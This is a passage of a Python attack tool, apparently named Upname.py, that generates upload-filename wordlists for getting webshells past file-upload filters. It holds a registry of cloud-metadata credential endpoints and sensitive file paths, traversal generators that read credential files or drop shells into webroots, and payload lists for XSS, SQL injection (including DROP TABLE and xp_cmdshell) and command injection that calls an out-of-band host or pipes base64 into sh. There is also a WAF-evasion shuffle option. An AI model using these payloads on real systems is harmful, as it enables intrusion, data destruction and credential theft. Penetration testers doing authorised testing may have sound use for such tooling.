      "C:/AzureData/CustomData.bin"
    ],

    "openstack": [
      "/var/lib/cloud/seed/config-drive/openstack/latest/meta_data.json",
      "/var/lib/cloud/seed/config-drive/openstack/latest/user_data",
      "/var/lib/cloud/seed/config-drive/openstack/latest/vendor_data.json",
      "/var/lib/cloud/seed/config-drive/openstack/latest/network_data.json",
      "/mnt/config/openstack/latest/meta_data.json",
      "/mnt/config/openstack/latest/user_data"
    ],

    "digitalocean": [
      "/var/lib/cloud/seed/nocloud-net/meta-data",
      "/var/lib/cloud/seed/nocloud-net/user-data",
      "/run/cloud-init/instance-data.json"
    ],

    "kubernetes_node": [
      "/etc/kubernetes/manifests/kube-apiserver.yaml",
      "/etc/kubernetes/manifests/kube-controller-manager.yaml",
      "/etc/kubernetes/manifests/kube-scheduler.yaml",
      "/etc/kubernetes/manifests/etcd.yaml",
      "/var/lib/kubelet/config.yaml",
      "/var/lib/kubelet/kubeadm-flags.env",
      "/var/lib/kubelet/pki/kubelet-client-current.pem",
      "/etc/cni/net.d/"
    ],

    "common_cloudinit": [
      "/etc/cloud/cloud.cfg",
      "/etc/cloud/cloud.cfg.d/",
      "/var/lib/cloud/instance/cloud-config.txt",
      "/var/lib/cloud/scripts/per-instance/",
      "/var/lib/cloud/scripts/per-boot/",
      "/var/lib/cloud/scripts/per-once/",
      "/var/lib/cloud/seed/",
      "/run/cloud-init/cloud-id",
      "/run/cloud-init/ds-identify.log",
      "/run/cloud-init/result.json",
      "/run/cloud-init/status.json",
      "/run/cloud-init/instance-data.json",
      "/run/cloud-init/instance-data-sensitive.json"
    ]
  },

  "ssrf_targets": {
    "$note": "HTTP/HTTPS cloud-metadata endpoints. NOT file paths — never routed through --file-read or path-traversal write payloads. Reserved for the SSRF module (ssrf_url) and any future SSRF-aware generator. Each provider sub-key is a flat URL list; provider-specific request-header requirements are documented in $headers.",
    "$headers": {
      "aws_imdsv2":  "PUT /latest/api/token with 'X-aws-ec2-metadata-token-ttl-seconds: 21600', then GET with 'X-aws-ec2-metadata-token: <token>'.",
      "gcp":         "All requests require 'Metadata-Flavor: Google'.",
      "azure":       "All requests require 'Metadata: true'."
    },

    "aws_imdsv1": [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/latest/meta-data/iam/info",
      "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
      "http://169.254.169.254/latest/meta-data/instance-id",
      "http://169.254.169.254/latest/meta-data/hostname",
      "http://169.254.169.254/latest/meta-data/local-ipv4",
      "http://169.254.169.254/latest/meta-data/public-ipv4",
      "http://169.254.169.254/latest/meta-data/mac",
      "http://169.254.169.254/latest/user-data/",
      "http://169.254.169.254/latest/dynamic/instance-identity/document",
      "http://169.254.169.254/latest/dynamic/instance-identity/signature"
    ],

    "aws_ecs_task_metadata": [
      "http://169.254.170.2/v2/credentials/",
      "http://169.254.170.2/v2/metadata"
    ],

    "aws_lambda": [
      "http://localhost:9001/2018-06-01/runtime/invocation/next"
    ],

    "gcp": [
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity",
      "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
      "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",
      "http://metadata.google.internal/computeMetadata/v1/project/project-id",
      "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
      "http://169.254.169.254/computeMetadata/v1/"
    ],

    "azure": [
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
    ],

    "alibaba": [
      "http://100.100.100.200/latest/meta-data/",
      "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
      "http://100.100.100.200/latest/user-data/"
    ],

    "digitalocean": [
      "http://169.254.169.254/metadata/v1/",
      "http://169.254.169.254/metadata/v1.json",
      "http://169.254.169.254/metadata/v1/user-data",
      "http://169.254.169.254/metadata/v1/hostname",
      "http://169.254.169.254/metadata/v1/region"
    ],

    "openstack": [
      "http://169.254.169.254/openstack/latest/",
      "http://169.254.169.254/openstack/latest/meta_data.json",
      "http://169.254.169.254/openstack/latest/user_data",
      "http://169.254.169.254/openstack/latest/password",
      "http://169.254.169.254/openstack/latest/vendor_data.json"
    ],

    "oracle_cloud": [
      "http://169.254.169.254/opc/v1/instance/",
      "http://169.254.169.254/opc/v1/instance/metadata/",
      "http://169.254.169.254/opc/v2/instance/"
    ],

    "ibm_cloud": [
      "http://169.254.169.254/instance_identity/v1/",
      "http://169.254.169.254/metadata/v1/"
    ],

    "packet_equinix": [
      "https://metadata.packet.net/metadata",
      "https://metadata.platformequinix.com/metadata"
    ],

    "kubernetes_node": [
      "http://169.254.169.254/latest/meta-data/",
      "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
    ]
  }
}
'''
EMBEDDED_PATHS = json.loads(_EMBEDDED_PATHS_JSON)

def _is_dir_path(p):
    """True when p looks like a *filesystem* directory marker — trailing '/'
    or '\\' AND not a URL. Used by the CLI layer to refuse literal
    --file-read on a dir, and by _resolve_paths_key to drop dir leaves from
    @key results without nuking trailing-slash URLs in @ssrf_targets."""
    if not isinstance(p, str) or len(p) <= 1:
        return False
    if p.startswith(("http://", "https://", "ftp://", "ftps://", "gopher://")):
        return False
    return p[-1] in ("/", "\\")


def _validate_file_read_or_die(fr, error_fn):
    """Reject a --file-read argument that points at a directory. Three cases:
      1. literal path (no '@'): must not end with '/' or '\\'
      2. @key resolves to nothing (key invalid or every leaf was a dir): reject
      3. @key resolves to a SINGLE dir leaf (user drilled too far into a dir):
         reject and ask them to pick a file inside
    Multi-leaf @key results are pre-filtered of dirs by _resolve_paths_key,
    so they never reach the dir checks here. error_fn(msg) must not return
    (typically argparse parser.error / sys.exit-style)."""
    if not fr:
        return
    if not fr.startswith("@"):
        if _is_dir_path(fr):
            error_fn(
                "--file-read %r is a directory path. Specify a file inside it "
                "(e.g. %sfoo.conf) — LFI payloads cannot 'read' a directory."
                % (fr, fr))
        return
    resolved = _resolve_paths_key(fr)
    if not resolved:
        error_fn(
            "--file-read %r did not resolve to any file leaves. Either the "
            "@key.path is unknown, or every entry under it was a directory "
            "(directories are filtered). Drill down to a more specific @key "
            "that yields a regular file." % fr)
    if len(resolved) == 1 and _is_dir_path(resolved[0]):
        error_fn(
            "--file-read %r resolves to a single directory leaf (%r). "
            "Pick a file path inside it instead of the directory itself."
            % (fr, resolved[0]))


def _resolve_paths_key(key, registry=None, allow_dirs=False):
    """Resolve '@category.sub[.leaf]' → list[str] of paths from the embedded
    registry (or supplied override). A literal (non-'@') key passes through
    as [key]. Returns None if the key cannot be resolved.

    Walks the tree collecting every string leaf; skips meta-keys starting
    with '$'. By default, directory-style leaves (trailing '/' or '\\')
    are silently dropped — '@linux' must resolve to readable FILES only.
    Pass allow_dirs=True for consumers that legitimately want directories
    (Upname's --webroot drop-target, where /var/www/html/ IS the answer).

    Single-leaf resolution (node is itself a string) is returned as-is so
    the CLI layer can reject a one-dir result with a clear error message."""
    if not isinstance(key, str) or not key.startswith("@"):
        return [key] if key else None
    reg = registry if registry is not None else EMBEDDED_PATHS
    parts = key[1:].split(".")
    node = reg
    for p in parts:
        if isinstance(node, dict) and p in node:
            node = node[p]
        else:
            return None
    if isinstance(node, str):
        return [node]
    leaves = []
    def _ok(s):
        return (isinstance(s, str)
                and not s.startswith("$")
                and (allow_dirs or not _is_dir_path(s)))
    def _walk(n):
        if isinstance(n, str):
            if _ok(n):
                leaves.append(n)
        elif isinstance(n, list):
            for x in n:
                if _ok(x):
                    leaves.append(x)
        elif isinstance(n, dict):
            for k, v in n.items():
                if k.startswith("$"):
                    continue
                _walk(v)
    _walk(node)
    return leaves or None
# ─── END EMBEDDED PATHS ──────────────────────────────────────────────────

# ─── Per-language executable extensions ──────────────────────────────────
# Canonical list — kept union-synchronised with UpGen.EXT (body-side
# generator) and UpMap.target_lang() (live-scanner extension router). When
# you add an extension here, mirror it into UpGen.EXT (same set, without
# the leading dot). The leading "." is preserved here because Upname
# concatenates these as filename suffixes (`shell` + `.php` → `shell.php`).
EXEC_EXTS = {
    "php":        [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7",
                   ".phtml", ".phtm", ".phar", ".pht", ".phps", ".pgif",
                   ".inc", ".hphp", ".ctp", ".module"],
    "asp":        [".asp", ".aspx", ".asa", ".asax", ".ashx", ".asmx", ".aspq",
                   ".axd", ".cer", ".cdx", ".config", ".cshtm", ".cshtml",
                   ".rem", ".shtml", ".soap", ".vbhtm", ".vbhtml", ".xamlx"],
    "jsp":        [".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".wss", ".do", ".action"],
    "coldfusion": [".cfm", ".cfml", ".cfc", ".cfr", ".dbm"],
    "perl":       [".pl", ".cgi", ".perl", ".pm", ".plx"],
}
ALL_LANGS = list(EXEC_EXTS.keys())

# Common image/doc extensions to spoof (when --allowed not set)
SPOOF_EXTS = ["jpg", "png", "gif", "bmp", "pdf", "tiff", "webp", "ico", "svg"]

# Null-byte / terminator family — 10 variants in raw + urlenc forms.
# Each terminator goes between exec ext and trailing image ext (both orders).
TERMINATORS_RAW = [
    ("nul",            "\x00"),
    ("semicolon",      ";"),
    ("space",          " "),
    ("newline",        "\n"),
    ("crlf",           "\r\n"),
    ("forwardslash",   "/"),
    ("backslashdot",   ".\\"),
    ("fourdots",       "...."),
]
TERMINATORS_URLENC = [
    ("nul",            "%00"),
    ("semicolon",      ";"),
    ("space",          "%20"),
    ("newline",        "%0a"),
    ("crlf",           "%0d%0a"),
    ("forwardslash",   "%2f"),
    ("backslashdot",   ".%5c"),
    ("fourdots",       "...."),
]

# Special chars / unicode tricks
RTL = "‮"        # right-to-left override
ELLIPSIS = "…"   # U+2026 horizontal ellipsis
FULLWIDTH_DOT = "．"

# Windows reserved device names — uploading these (with any ext) breaks naive
# Windows servers that try to open the file by name.
WIN_RESERVED = ["CON", "PRN", "AUX", "NUL",
                "COM1", "COM2", "COM3", "COM4",
                "LPT1", "LPT2", "LPT3"]

# Name overflow target lengths (bytes)
OVERFLOW_LENGTHS = [236, 255, 4096]
PAD_CHAR = "A"

# ─── XSS payloads (used as the entire filename body) ─────────────────────
XSS_PAYLOADS = [
    '<svg onload=alert(1)>',
    '<svg onload=alert(document.cookie)>',
    '<svg onload=alert(document.domain)>',
    '<svg onload=confirm(1)>',
    '<svg onload=prompt(1)>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.cookie)>',
    '<img src=x onerror=alert(document.domain)>',
    '<img src=x onerror=prompt(document.cookie)>',
    '<iframe src=javascript:alert(1)>',
    '<iframe src=javascript:alert(document.cookie)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<select autofocus onfocus=alert(1)>',
    'javascript:alert(1)',
]

# ─── SQLi payloads ───────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    # Boolean
    "' OR '1'='1",
    "' OR 1=1-- ",
    '" OR "1"="1',
    "') OR ('1'='1",
    "admin'-- ",
    "admin'#",
    # Time-based
    "'; WAITFOR DELAY '0:0:10'-- ",
    "'; SELECT pg_sleep(10)-- ",
    "'; SELECT SLEEP(10)-- ",
    ";sleep 10;",
    "sleep(10)-- -",
    "1' AND SLEEP(10)-- ",
    # Union marker
    "' UNION SELECT NULL-- ",
    "') UNION SELECT NULL,NULL-- ",
    # Stacked
    "'; DROP TABLE uploads-- ",
    # MSSQL xp_cmdshell
    "'; EXEC xp_cmdshell('whoami')-- ",
    # Out-of-band MySQL load_file marker
    "' UNION SELECT load_file('/etc/passwd')-- ",
    # Decoy-response: filename mimics expected MySQL error text. If the server
    # echoes the filename verbatim into the response, this looks like real
    # SQLi reflection — detection trick from the sample corpus.
    "<font color=red>ERROR 1064 (42000): You have an error in your SQL syntax;</font>",
]

# ─── Command injection payloads ──────────────────────────────────────────
CMDI_PAYLOADS = [
    ";id;",
    "|id",
    "`id`",
    "$(id)",
    "&& id",
    "|| id",
    ";id|base64",
    "& whoami",
    "; sleep 10;",
    "|sleep 10",
    "$(sleep 10)",
    "`sleep 10`",
    "; curl http://OAST/x;",
    "$(curl http://OAST/x)",
    "; nslookup OAST.example.com;",
    "${IFS}id",                       # IFS spacing trick
    ";{cat,/etc/passwd}",             # brace expansion
    "%0a id %0a",                     # newline injection
    "$(echo aWQ=|base64 -d|sh)",      # base64-wrapped 'id'
]


# ─── helpers ─────────────────────────────────────────────────────────────

def dedupe(seq):
    seen = set()
    out = []
    for x in seq:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def case_variants(ext):
    """Return a small set of case variants of an extension token ('php' →
    'pHp','PhP','PHP','Php',...). Bounded — toggles each char once."""
    ext = ext.lstrip(".")
    out = {ext.lower(), ext.upper(), ext.capitalize()}
    for i in range(len(ext)):
        chars = list(ext.lower())
        chars[i] = chars[i].upper()
        out.add("".join(chars))
        chars = list(ext.upper())
        chars[i] = chars[i].lower()
        out.add("".join(chars))
    return sorted(out)


def load_paths_json(path):
    """Load paths registry. Order of precedence:
      1. External --paths-json FILE if provided AND readable.
      2. Embedded EMBEDDED_PATHS constant (always available — injected from
         paths.json by _embed_paths.py).
    Never returns None — the embedded copy is the fallback so Upname is
    fully independent of any external file."""
    if path is not None and path.exists():
        try:
            with path.open(encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            sys.stderr.write(f"warning: could not parse {path}: {e}; "
                             f"falling back to embedded copy\n")
    return EMBEDDED_PATHS


def resolve_paths_key(registry, key, allow_dirs=False):
    """Resolve '@category.subcat[.leaf]' → list[str]. Thin wrapper over the
    shared _resolve_paths_key helper injected by _embed_paths.py. Pass
    allow_dirs=True for --webroot (drop-targets are dirs by design)."""
    return _resolve_paths_key(key, registry, allow_dirs=allow_dirs)


def line_safe(s):
    """Return s if it can survive a one-line-per-entry wordlist (no raw
    LF/CR). NUL bytes ARE allowed — they don't split lines and Burp/ffuf
    handle them. Lines containing raw \\n or \\r return None and are
    skipped (their _urlenc.txt sibling carries the same intent line-safely
    via %0a / %0d%0a)."""
    return s if ("\n" not in s and "\r" not in s) else None


def write_wordlist(lines, path, max_lines=None):
    """Write deduped lines, one per row. Returns (written, skipped) where
    skipped counts lines dropped for being newline-unsafe."""
    if max_lines is not None:
        lines = lines[:max_lines]
    written, skipped = 0, 0
    with path.open("w", encoding="utf-8", newline="\n") as f:
        for line in lines:
            safe = line_safe(line)
            if safe is None:
                skipped += 1
                continue
            f.write(safe + "\n")
            written += 1
    return written, skipped


# ─── TECHNIQUES (filter-bypass family) ───────────────────────────────────
# Each returns dict {"raw": [...], ...} or {"raw": [...], "urlenc": [...]}.

def tech_extension_shuffle(stems, lang, allowed, **_):
    out = []
    for stem in stems:
        for ext in EXEC_EXTS[lang]:
            out.append(f"{stem}{ext}")
        # case variants on the primary extension only (bounded)
        primary = EXEC_EXTS[lang][0].lstrip(".")
        for cv in case_variants(primary):
            out.append(f"{stem}.{cv}")
    return {"raw": dedupe(out)}


def tech_double_extension(stems, lang, allowed, **_):
    out = []
    exec_exts = EXEC_EXTS[lang]
    img_exts = [allowed] if allowed else SPOOF_EXTS
    for stem in stems:
        for e in exec_exts:
            for img in img_exts:
                out.append(f"{stem}{e}.{img}")    # shell.php.jpg
                out.append(f"{stem}.{img}{e}")    # shell.jpg.php
            out.append(f"{stem}{e}{e}")           # shell.php.php (same)
    return {"raw": dedupe(out)}


def tech_null_byte_cutoff(stems, lang, allowed, **_):
    raw, urlenc = [], []
    exec_exts = EXEC_EXTS[lang]
    img_exts = [allowed] if allowed else SPOOF_EXTS
    for stem in stems:
        for e in exec_exts:
            for img in img_exts:
                for _label, term in TERMINATORS_RAW:
                    raw.append(f"{stem}{e}{term}.{img}")
                    raw.append(f"{stem}.{img}{term}{e}")
                for _label, term in TERMINATORS_URLENC:
                    urlenc.append(f"{stem}{e}{term}.{img}")
                    urlenc.append(f"{stem}.{img}{term}{e}")
    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


def tech_stripping_extension(stems, lang, allowed, **_):
    """Recursive-strip dodge: server strips the blocked substring once;
    these variants leave behind something the handler still executes."""
    out = []
    for stem in stems:
        for ext in EXEC_EXTS[lang]:
            e = ext.lstrip(".")
            # Mid-extension splits (.p.phphp etc.) — direct from the catalog.
            out.append(f"{stem}.p.{e}{e}")
            out.append(f"{stem}.p{e}{e}")
            out.append(f"{stem}.{e}{e}")
            out.append(f"{stem}.{e}.{e}")
            out.append(f"{stem}.{e[0]}.{e}{e[1:]}")
            # Inner duplication (strip leaves a valid copy).
            out.append(f"{stem}.{e}{e}{e}")
            # Trailing-token tricks the filter peeks at the END but server
            # picks the first.
            out.append(f"{stem}.{e}.bak")
            out.append(f"{stem}.{e}.disabled")
            out.append(f"{stem}.{e}~")
    return {"raw": dedupe(out)}


def tech_discrepancy(stems, lang, allowed, **_):
    """Dot-encoding mismatches across decoding layers."""
    raw, urlenc = [], []
    for stem in stems:
        for ext in EXEC_EXTS[lang]:
            e = ext.lstrip(".")
            # Raw forms
            raw.append(f"{stem}{FULLWIDTH_DOT}{e}")  # U+FF0E fullwidth dot
            raw.append(f"{stem}.{e}.")               # trailing dot
            raw.append(f"{stem}..{e}")               # double dot
            raw.append(f"{stem}.{e}{ELLIPSIS}")      # ellipsis after ext
            # URL-encoded forms
            urlenc.append(f"{stem}%2e{e}")
            urlenc.append(f"{stem}%252e{e}")
            urlenc.append(f"{stem}%252E{e}")
            urlenc.append(f"{stem}.{e}%20")
            urlenc.append(f"{stem}%2e{e}%00")
            urlenc.append(f"{stem}.{e}%2e")
    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


def tech_name_overflow(stems, lang, allowed, **_):
    """Pad to 236 / 255 / 4096 byte truncation thresholds. After server
    truncates at its limit, the trailing image extension falls off,
    leaving the exec extension exposed."""
    out = []
    exec_exts = EXEC_EXTS[lang]
    img_exts = [allowed] if allowed else SPOOF_EXTS
    for stem in stems:
        for length in OVERFLOW_LENGTHS:
            for e in exec_exts:
                for img in img_exts:
                    suffix = f"{e}.{img}"
                    pad = length - len(stem) - len(suffix)
                    if pad > 0:
                        out.append(f"{stem}{PAD_CHAR * pad}{suffix}")
                # Pad between stem and exec ext (no image trailer)
                pad2 = length - len(stem) - len(e)
                if pad2 > 0:
                    out.append(f"{stem}{PAD_CHAR * pad2}{e}")
    return {"raw": dedupe(out)}


def tech_special_char_bypass(stems, lang, allowed, **_):
    raw, urlenc = [], []
    exec_exts = EXEC_EXTS[lang]
    img_exts = [allowed] if allowed else ["jpg", "png"]
    for stem in stems:
        for e in exec_exts:
            # Trailing modifiers
            raw.append(f"{stem}{e}.")             # trailing dot (NTFS strips)
            raw.append(f"{stem}{e} ")             # trailing space (NTFS strips)
            raw.append(f"{stem}{e}..")            # double trailing dot
            raw.append(f"{stem}{e}{ELLIPSIS}")    # ellipsis
            # NTFS ADS — colon is illegal on disk, must go on the wire
            raw.append(f"{stem}{e}:.jpg")
            raw.append(f"{stem}{e}::$DATA")
            raw.append(f"{stem}{e}::$INDEX_ALLOCATION")
            urlenc.append(f"{stem}{e}%3a.jpg")
            urlenc.append(f"{stem}{e}%3a%3a$DATA")
            # Path-separator confusion
            raw.append(f"{stem}{e}/")
            raw.append(f"{stem}{e}/.")
            raw.append(f"{stem}{e}.\\")
            urlenc.append(f"{stem}{e}%2f")
            urlenc.append(f"{stem}{e}%2f.")
            urlenc.append(f"{stem}{e}.%5c")
            # RTL override — displays as "shell.{img}.{ext}" to a human
            # reviewer; actual bytes still end in .{ext}
            for img in img_exts:
                reversed_img = img[::-1]
                raw.append(f"{stem}{RTL}{reversed_img}{e}")
                urlenc.append(f"{stem}%E2%80%AE{reversed_img}{e}")
            # Leading dash (POSIX option-eater)
            raw.append(f"-{stem}{e}")
            raw.append(f"--{stem}{e}")
            # Leading dot (hidden file on *nix)
            raw.append(f".{stem}{e}")
            # No extension at all
            raw.append(f"{stem}")
            # Newline-in-extension (only urlenc form survives wordlist)
            urlenc.append(f"{stem}{e}%0a.jpg")
            urlenc.append(f"{stem}{e}%0d%0a.jpg")
            # Dot-space-allowed (parser splits on space, keeps .ext)
            raw.append(f"{stem}{e} .jpg")
        # Windows reserved device names
        for name in WIN_RESERVED:
            for e in exec_exts:
                raw.append(f"{name}{e}")
    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


def tech_wordlist_fuzzer(stems, lang, allowed, **_):
    """Kitchen sink — union of every other technique. Pass this when you
    don't care about attribution and just want one big list."""
    raw, urlenc = [], []
    for fn in (tech_extension_shuffle, tech_double_extension,
               tech_null_byte_cutoff, tech_stripping_extension,
               tech_discrepancy, tech_name_overflow,
               tech_special_char_bypass):
        result = fn(stems, lang, allowed)
        raw.extend(result.get("raw", []))
        urlenc.extend(result.get("urlenc", []))
    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


# ─── ATTACKS (injection via filename) ────────────────────────────────────

def attack_path_traversal(stems, lang, allowed, depth=8,
                          file_read=None, webroot_paths=None, **_):
    """Two modes, both emitted:
      READ  — ../{N}/{target_file}.{img}   (LFI via traversal in filename)
      WRITE — ../{N}/{webroot}/{stem}{ext} (drop a shell into a known dir)
    """
    raw, urlenc = [], []
    exec_exts = EXEC_EXTS[lang]
    img_exts = [allowed] if allowed else ["jpg"]
    targets = file_read if isinstance(file_read, list) else [file_read or "/etc/passwd"]

    # READ mode — climb out + read system path + .img suffix
    for tgt in targets:
        if not tgt:
            continue
        tgt_unix = tgt.lstrip("/").replace("\\", "/")
        tgt_win  = tgt.lstrip("/").replace("/", "\\")
        for img in img_exts:
            for d in range(1, depth + 1):
                # Unix-style traversal
                raw.append("../" * d + tgt_unix + f".{img}")
                # Windows-style traversal (backslashes)
                raw.append("..\\" * d + tgt_win + f".{img}")
                # URL-encoded variants
                urlenc.append("..%2f" * d + quote(tgt_unix, safe="/") + f".{img}")
                urlenc.append("..%5c" * d + quote(tgt_win, safe="\\") + f".{img}")
                urlenc.append("%2e%2e%2f" * d + quote(tgt_unix, safe="/") + f".{img}")
                urlenc.append("%2e%2e%5c" * d + quote(tgt_win, safe="\\") + f".{img}")
                urlenc.append("%252e%252e%252f" * d + quote(tgt_unix, safe="/") + f".{img}")
                # "....//" doubled-slash dodge
                urlenc.append("....//" * d + quote(tgt_unix, safe="/") + f".{img}")
                # Tomcat ";" path-param trick
                urlenc.append("..;/" * d + quote(tgt_unix, safe="/") + f".{img}")

    # WRITE mode — only when --webroot given
    if webroot_paths:
        for stem in stems:
            for e in exec_exts:
                for wr in webroot_paths:
                    if not wr:
                        continue
                    wr_unix = wr.strip("/").replace("\\", "/")
                    wr_win  = wr.strip("/").replace("/", "\\")
                    for d in range(1, depth + 1):
                        raw.append("../" * d + f"{wr_unix}/{stem}{e}")
                        raw.append("..\\" * d + f"{wr_win}\\{stem}{e}")
                        urlenc.append("..%2f" * d + quote(wr_unix, safe="/") + f"%2f{stem}{e}")
                        urlenc.append("%2e%2e%2f" * d + quote(wr_unix, safe="/") + f"%2f{stem}{e}")

    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


def attack_xss_filename(stems, lang, allowed, **_):
    """XSS payload IS the filename body. Stem is irrelevant — the payload
    must be the leading bytes so it sits in the rendered output verbatim."""
    raw, urlenc = [], []
    img_exts = [allowed] if allowed else ["jpg", "png"]
    for payload in XSS_PAYLOADS:
        for img in img_exts:
            raw.append(f"{payload}.{img}")
            urlenc.append(f"{quote(payload, safe='')}.{img}")
    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


def attack_sqli_filename(stems, lang, allowed, **_):
    """SQLi payload appended to a normal stem. The filename gets INSERTed
    into a DB row (uploads table, log table) — the SQL injection fires
    server-side at insert time."""
    raw, urlenc = [], []
    img_exts = [allowed] if allowed else ["jpg"]
    for stem in stems:
        for payload in SQLI_PAYLOADS:
            for img in img_exts:
                raw.append(f"{stem}{payload}.{img}")
                urlenc.append(f"{stem}{quote(payload, safe='')}.{img}")
    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


def attack_command_injection_filename(stems, lang, allowed, **_):
    """Command-injection payload as filename. Fires when the server passes
    the filename to system()/exec()/popen — e.g. ImageMagick convert,
    ffmpeg, AV scanner, thumbnail generator."""
    raw, urlenc = [], []
    img_exts = [allowed] if allowed else ["jpg"]
    for stem in stems:
        for payload in CMDI_PAYLOADS:
            for img in img_exts:
                raw.append(f"{stem}{payload}.{img}")
                urlenc.append(f"{stem}{quote(payload, safe='')}.{img}")
    return {"raw": dedupe(raw), "urlenc": dedupe(urlenc)}


# ─── registry ────────────────────────────────────────────────────────────

TECHNIQUES = {
    "extension_shuffle":     ("Alt exec extensions + case variants",                 tech_extension_shuffle),
    "double_extension":      ("shell.php.jpg / shell.jpg.php / shell.php.php",       tech_double_extension),
    "null_byte_cutoff":      ("10 terminators (NUL/;/space/newline/CRLF/...) × 2 positions", tech_null_byte_cutoff),
    "stripping_extension":   ("Recursive-strip dodge (.p.phphp / .pphphp / ...)",    tech_stripping_extension),
    "discrepancy":           ("Dot-encoding mismatch (%2e/%252e/fullwidth/trailing)", tech_discrepancy),
    "name_overflow":         ("Pad to 236/255/4096-byte truncation thresholds",      tech_name_overflow),
    "special_char_bypass":   ("Trailing dot/space, ADS, RTL, reserved names, etc.",  tech_special_char_bypass),
    "wordlist_fuzzer":       ("Kitchen-sink — union of every technique above",       tech_wordlist_fuzzer),
}

ATTACKS = {
    "path_traversal_filename":    ("Traversal to read system file OR drop shell into webroot",
                                   attack_path_traversal),
    "xss_filename":               ("XSS payload as filename (fires when name is echoed in HTML)",
                                   attack_xss_filename),
    "sqli_filename":              ("SQLi payload as filename (fires on INSERT into uploads table)",
                                   attack_sqli_filename),
    "command_injection_filename": ("Command-injection as filename (fires when passed to system())",
                                   attack_command_injection_filename),
}


# ─── color (legacy inline wrappers — backed by the shared palette) ───────
# Kept for the existing --list and 'done' summary call sites below; new
# code should use the palette directly (G/Y/C/R/BLD/RS) for consistency
# with UpMap.py / UpGen.py.
def green(s):  return f"{G}{s}{RS}"
def yellow(s): return f"{Y}{s}{RS}"
def cyan(s):   return f"{C}{s}{RS}"
def red(s):    return f"{R}{s}{RS}"
def bold(s):   return f"{BLD}{s}{RS}"


# ─── main ────────────────────────────────────────────────────────────────

def build_parser():
    p = argparse.ArgumentParser(
        prog="Upname.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=(
            "Upload-filename wordlist generator (sibling of UpGen.py / UpMap.py).\n"
            "UpGen makes payload BODIES; Upname makes filename STRINGS; UpMap\n"
            "delivers both live against a target.\n"
        ),
        epilog=(
            "Examples:\n"
            "  Upname.py all\n"
            "  Upname.py null_byte_cutoff double_extension -E php\n"
            "  Upname.py --technique all --attack all -E asp -A png\n"
            "  Upname.py path_traversal_filename --file-read @linux.credentials\n"
            "  Upname.py path_traversal_filename --webroot @webroots.php.linux\n"
            "  Upname.py xss_filename sqli_filename --mega\n"
        ),
    )
    p.add_argument("selectors", nargs="*", metavar="NAME",
                   help="Technique or attack name(s) — auto-routed. Or 'all'.")
    p.add_argument("--technique", action="append", default=None, metavar="NAME",
                   help="Explicit technique(s), comma-separated or repeatable. 'all' OK.")
    p.add_argument("--attack", action="append", default=None, metavar="NAME",
                   help="Explicit attack(s), comma-separated or repeatable. 'all' OK.")
    p.add_argument("-E", "--extension", default="all",
                   choices=ALL_LANGS + ["all"],
                   help="Target backend language (default: all)")
    p.add_argument("-A", "--allowed", default=None, metavar="EXT",
                   help="Server-accepted image extension (jpg/png/...). "
                        "Default: try every common one.")
    p.add_argument("-o", "--output", default="Upname_out", metavar="DIR",
                   help="Output directory (default: Upname_out)")
    p.add_argument("--stem", default="shell", metavar="NAME",
                   help="Base filename stem (default: shell)")
    p.add_argument("--stems", default=None, metavar="LIST",
                   help="Multi-stem fan-out, comma-separated (e.g. shell,payload,x)")
    p.add_argument("--depth", type=int, default=8, metavar="N",
                   help="Path-traversal depth (default: 8)")
    p.add_argument("--file-read", dest="file_read", default=None, metavar="PATH",
                   help="Path-traversal READ target. Literal path OR @paths.json key "
                        "(e.g. @linux.credentials, @windows.system_info). Default: /etc/passwd")
    p.add_argument("--webroot", default=None, metavar="PATH",
                   help="Path-traversal WRITE target dir. Literal path OR @paths.json key "
                        "(e.g. @webroots.php.linux). When set, traversal also emits "
                        "'drop shell into webroot' payloads.")
    p.add_argument("--max-per-technique", type=int, default=None, metavar="N",
                   help="Cap output lines per file (default: unlimited)")
    p.add_argument("--seed", type=int, default=None, metavar="N",
                   help="Shuffle line order for WAF evasion (default: deterministic)")
    p.add_argument("--mega", action="store_true",
                   help="Also emit a single all.txt rollup per language")
    p.add_argument("--paths-json", default=None, metavar="FILE",
                   help="Path to paths.json registry (default: ./paths.json next to script)")
    p.add_argument("-l", "--list", action="store_true",
                   help="List techniques + attacks and exit")
    return p


def main():
    parser = build_parser()
    opts = parser.parse_args()

    if opts.list:
        banner()
        divider = f"  {C}{'─' * 60}{RS}"
